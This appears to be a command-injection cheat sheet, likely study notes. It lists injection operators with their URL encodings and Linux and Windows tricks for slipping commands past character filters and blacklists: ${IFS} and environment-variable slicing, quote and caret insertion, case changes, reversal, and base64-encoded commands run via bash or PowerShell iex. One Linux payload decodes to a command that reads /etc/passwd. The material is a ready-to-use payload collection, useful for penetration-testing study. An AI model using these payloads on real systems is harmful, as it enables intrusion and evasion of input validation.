```bash

===============
= Injection Operators =
===============
; → %3b → Both  
\n → %0a → Both  
& → %26 → Both  
| → %7c → Both (2nd output only)  
&& → %26%26 → Both (if 1st OK)  
|| → %7c%7c → 2nd (if 1st fails)  
`` (backticks) → %60%60 → Linux  
$() → %24%28%29 → Linux  

----------------
# Linux
----------------

=== Filtered Character Bypass ===
printenv → view env vars  
Spaces:
  %09 → tab  
  ${IFS} → space+tab  
  {ls,-la} → commas = spaces  
Other chars:
  ${PATH:0:1} → /  
  ${LS_COLORS:10:1} → ;  
  $(tr '!-}' '"-~'<<<[) → shift char ([→\)

=== Blacklisted Command Bypass ===
Character insertion:
  '  "  $@  \  
Case bypass:
  $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")  
  $(a="WhOaMi";printf %s "${a,,}")  
Reversed:
  echo whoami | rev  
  $(rev<<<'imaohw')  
Encoded:
  echo -n 'cat ...' | base64  
  bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

----------------
# Windows
----------------

=== Filtered Character Bypass ===
Get-ChildItem Env:  
Spaces:
  %09  
  %PROGRAMFILES:~10,-5% → space  
  $env:PROGRAMFILES[10] → space  
Other chars:
  %HOMEPATH:~0,-17% → \  
  $env:HOMEPATH[0] → \  

=== Blacklisted Command Bypass ===
Character insertion:
  '  "  ^  
Case:
  WhoAmi  
Reversed:
  "whoami"[-1..-20] -join ''  
  iex "$('imaohw'[-1..-20] -join '')"  
Encoded:
  [Convert]::ToBase64String(...'whoami')  
  iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

```